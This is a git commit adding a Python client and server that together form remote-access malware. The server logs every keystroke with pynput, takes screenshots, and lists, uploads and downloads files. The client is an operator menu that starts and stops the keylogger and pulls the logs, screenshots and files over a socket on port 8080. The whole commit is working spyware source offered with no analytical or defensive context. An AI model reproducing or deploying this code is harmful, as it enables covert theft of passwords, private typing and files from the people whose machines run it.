34664da4e5c7d008c14b2a94814988d5e1693222
Leonty <krokxa228@gmail.com>
2024-10-03 18:50:14 +0500

    Inition

---
+++ client_32.py
@@ -0,0 +1,157 @@
+import socket
+import struct
+import pickle
+import os
+
+# Глобальная переменная для сокета
+client_socket = None
+
+# Функция для отправки команды на сервер
+def send_command(command):
+    global client_socket
+    try:
+        if command not in ['screenshot', 'send_file', 'get_file']:
+            client_socket.sendall(command.encode('utf-8'))
+            print(f"Sent command: {command}")
+
+        if command == "screenshot":
+            client_socket.sendall(command.encode('utf-8'))
+            print(f"Sent command: {command}")
+            payload_size = struct.calcsize(">Q")
+            data = b""
+            while len(data) < payload_size:
+                data += client_socket.recv(1024)
+            packed_image_size = data[:payload_size]
+            image_size = struct.unpack(">Q", packed_image_size)[0]
+            data = data[payload_size:]
+            while len(data) < image_size:
+                data += client_socket.recv(1024)
+            frame_data = data[:image_size]
+            image = pickle.loads(frame_data)  # Десериализация изображения
+            # Сохранение изображения
+            image.save("screenshot.png")
+            print("Screenshot saved as screenshot.png")
+
+        elif command == 'send_file':
+            file_path = input("Enter the path of the file to send: ")
+            if os.path.exists(file_path):
+                file_name = os.path.basename(file_path)
+                file_size = os.path.getsize(file_path)
+
+                client_socket.sendall("receive_file:{}".format(file_name).encode('utf-8'))  # Отправляем команду с именем файла
+                print("Sent command: {}".format(command))
+
+                response = client_socket.recv(1024)
+
+                if response == b"READY_TO_RECEIVE":
+                    # Отправляем размер файла
+                    client_socket.sendall(struct.pack(">Q", file_size))
+                    print("Sending file '{}' of size {} bytes...".format(file_name, file_size))
+
+                    # Отправляем содержимое файла
+                    with open(file_path, "rb") as f:
+                        while True:
+                            bytes_read = f.read(1024)
+                            if not bytes_read:
+                                break
+                            client_socket.sendall(bytes_read)
+
+                    response = client_socket.recv(1024)
+                    print("File '{}' successfully sent.".format(file_name))
+                else:
+                    print("Server is not ready to receive the file.")
+            else:
+                print("File not found.")
+
+        elif command == 'get_file':
+            client_socket.sendall(command.encode('utf-8'))
+            print("Sent command: {}".format(command))
+            # Определяем путь для сохранения файлов в папке "files" в текущей директории
+            save_path = os.path.join(os.getcwd(), "files")
+            # Создаем директорию, если она не существует
+            if not os.path.exists(save_path):
+                os.makedirs(save_path)
+            # Получаем список файлов от сервера
+            files_list = client_socket.recv(1024).decode('utf-8')
+            print("Available files on server:\n" + files_list)
+            # Выбираем файл для загрузки
+            file_name = input("Enter the name of the file you want to receive: ")
+            client_socket.sendall(file_name.encode('utf-8'))
+            # Проверяем, готов ли сервер отправить файл
+            response = client_socket.recv(1024)
+            if response == b"READY_TO_SEND":
+                # Получаем размер файла
+                packed_file_size = client_socket.recv(8)
+                file_size = struct.unpack(">Q", packed_file_size)[0]
+                print("Receiving file '{}' of size {} bytes...".format(file_name, file_size))
+                # Получаем и сохраняем файл
+                received_size = 0
+                file_path = os.path.join(save_path, file_name)  # Сохраняем в папку "files"
+                with open(file_path, "wb") as f:
+                    while received_size < file_size:
+                        data = client_socket.recv(1024)
+                        if not data:
+                            break
+                        f.write(data)
+                        received_size += len(data)
+                print("File '{}' successfully received and saved in '{}'.".format(file_name, file_path))
+            else:
+                print("File not found on server.")
+    except Exception as e:
+        print("An error occurred: {}".format(e))
+
+
+# Основное меню клиента
+def client_menu():
+    while True:
+        print("\n1. Start keylogger")
+        print("2. Stop keylogger")
+        print("3. Show logs")
+        print("4. Clear logs")
+        print("5. Take screenshot")
+        print("6. Send File")
+        print("7. Get File")
+        print("8. Exit")
+        choice = input("Enter your choice: ")
+
+        if choice == '1':
+            send_command("keylogger_start")
+            print("Keylogger started.")
+        elif choice == '2':
+            send_command("keylogger_stop")
+            logs = client_socket.recv(1024).decode('utf-8')
+            print("Keylogger stopped.")
+        elif choice == '3':  # Show logs
+            send_command("keylogger_show")
+            logs = client_socket.recv(1024).decode('utf-8')  # Получаем логи от сервера
+            print("Logs from server:\n" + logs)
+
+        elif choice == '4':
+            send_command("keylogger_clear")
+            logs = client_socket.recv(1024).decode('utf-8')
+            print("Logs cleared.")
+        elif choice == '5':
+            send_command("screenshot")
+        elif choice == '6':
+            send_command("send_file")
+        elif choice == '7':
+            send_command("get_file")
+        elif choice == '8':
+            print("Exiting...")
+            break
+        else:
+            print("Invalid choice. Please try again.")
+
+
+# Запуск клиента
+if __name__ == "__main__":
+    try:
+        # Открытие сокета
+        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        client_socket.connect(('localhost', 8080))
+        client_menu()
+    except Exception as e:
+        print("An error occurred while connecting to the server: {}".format(e))
+    finally:
+        if client_socket:
+            client_socket.close()  # Закрываем сокет при выходе
---
+++ server_32.py
@@ -0,0 +1,190 @@
+import pickle
+import socket
+import threading
+import atexit
+import os
+import struct
+import sys
+
+import pyautogui
+import win32gui
+import win32ui
+import win32con
+from pynput.keyboard import Listener  # Импортируем Listener из библиотеки pynput
+
+
+
+# Константы
+FILE_NAME = "./keystrokes.log"
+recording = False
+output = None
+keyboard_listener = None  # Хранить слушателя клавиатуры
+
+
+# Функция для записи в лог
+def log_action(action):
+    print(f"Logging action: {action}")
+    with open(FILE_NAME, "a") as f:
+        f.write(action + "\n")
+
+
+
+# Функция для очистки лог-файла
+def clear_log_file():
+    with open(FILE_NAME, "w") as f:
+        f.truncate()  # Очищаем содержимое файла
+    log_action("Log file cleared.")  # Записываем в лог, что файл очищен
+
+
+# Функция для записи нажатий клавиш
+def on_press(key):
+    try:
+        log_action(f"Key pressed: {key.char}")  # Записываем символ
+    except AttributeError:
+        log_action(f"Special key pressed: {key}")  # Записываем специальные клавиши (Shift, Ctrl и т.д.)
+
+
+# Функция для завершения работы
+def onexit():
+    if output:
+        output.close()
+    if keyboard_listener:
+        keyboard_listener.stop()  # Останавливаем слушатель
+
+
+# Обработка входящих соединений
+def handle_client(conn):
+    global recording, output, keyboard_listener
+    print("Client connected")
+
+    while True:
+        command = conn.recv(1024).decode('utf-8')
+        if command:
+            print("Received command: {}".format(command))
+        else:
+            continue
+
+        if command == "keylogger_start":
+            if not recording:
+                print("Attempting to start keylogger...")  # Отладочное сообщение
+                recording = True
+                output = open(FILE_NAME, "a")
+                atexit.register(onexit)
+                log_action("Started recording keyboard inputs.")
+                print("Starting Listener...")  # Отладочное сообщение
+                keyboard_listener = Listener(on_press=on_press)
+                keyboard_listener.start()
+                print("Listener started...")  # Проверка успешного запуска слушателя
+                conn.sendall("Keylogger started.".encode('utf-8'))
+                print("Keylogger started.")
+
+            else:
+                conn.sendall("Keylogger is already running.".encode('utf-8'))
+
+        elif command == "keylogger_stop":
+            if recording:  # Проверка, идет ли запись
+                recording = False
+                log_action("Stopped recording.")
+                if keyboard_listener:
+                    keyboard_listener.stop()  # Останавливаем слушатель клавиатуры
+                conn.sendall("Keylogger stopped.".encode('utf-8'))
+                print("Keylogger stopped.")
+            else:
+                conn.sendall("Keylogger is not running.".encode('utf-8'))
+
+
+        elif command == "keylogger_show":
+            with open(FILE_NAME, "r") as f:
+                log_data = f.read()
+            if log_data:
+                conn.sendall(log_data.encode('utf-8'))
+            else:
+                conn.sendall("No logs available.".encode('utf-8'))
+
+        elif command == "keylogger_clear":
+            clear_log_file()
+            conn.sendall("Logs cleared.".encode('utf-8'))
+
+        elif command == "screenshot":
+            screenshot = pyautogui.screenshot()
+            imageBytes = pickle.dumps(screenshot)  # Сериализация изображения
+            conn.sendall(struct.pack(">Q", len(imageBytes)) + imageBytes)  # Отправка размера и байтов изображения
+            print("Screenshot sent.")
+
+
+        elif command.startswith("receive_file:"):
+            file_name = command.split(":")[1]
+            conn.sendall(b"READY_TO_RECEIVE")
+            print("Ready to receive file: {}".format(file_name))
+
+            # Получаем размер файла
+            packed_file_size = conn.recv(8)
+            file_size = struct.unpack(">Q", packed_file_size)[0]
+            print("Receiving file of size {} bytes...")
+
+            # Получаем и сохраняем файл
+            received_size = 0
+            with open(file_name, "wb") as f:
+                while received_size < file_size:
+                    data = conn.recv(1024)
+                    if not data:
+                        break
+                    f.write(data)
+                    received_size += len(data)
+            print("File '{}' successfully received.".format(file_name))
+            conn.sendall(b"File received successfully")
+
+        elif command.startswith("get_file"):
+            directory = "./"
+            if not os.path.exists(directory):
+                os.makedirs(directory)
+
+            # Отправляем список файлов клиенту
+            files = os.listdir(directory)
+            files_list = "\n".join(files) if files else "No files available"
+            conn.sendall(files_list.encode('utf-8'))
+
+            # Ждем выбор файла от клиента
+            file_name = conn.recv(1024).decode('utf-8')
+            file_path = os.path.join(directory, file_name)
+
+            if os.path.exists(file_path):
+                conn.sendall(b"READY_TO_SEND")
+                file_size = os.path.getsize(file_path)
+                conn.sendall(struct.pack(">Q", file_size))
+
+                # Отправляем файл клиенту
+                with open(file_path, "rb") as f:
+                    while True:
+                        bytes_read = f.read(1024)
+                        if not bytes_read:
+                            break
+                        conn.sendall(bytes_read)
+                print("File '{}' sent to client.".format(file_path))
+            else:
+                conn.sendall(b"FILE_NOT_FOUND")
+        else:
+            conn.sendall(b"Command not recognized")
+
+
+# Основная функция для запуска сервера
+def start_server():
+    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server_socket:
+        server_socket.bind(('0.0.0.0', 8080))
+        server_socket.listen(1)
+        print("Server listening on port 8080")
+        while True:
+            conn, addr = server_socket.accept()
+            print("Connection from {}".format(addr))
+            threading.Thread(target=handle_client, args=(conn,)).start()
+
+
+if __name__ == "__main__":
+    try:
+        start_server()
+    except KeyboardInterrupt:
+        print("\nServer stopped by user.")
+    except Exception as e:
+        print("An error occurred: {}".format(e))
+    finally:
+        onexit()  # Убедитесь, что все ресурсы освобождены
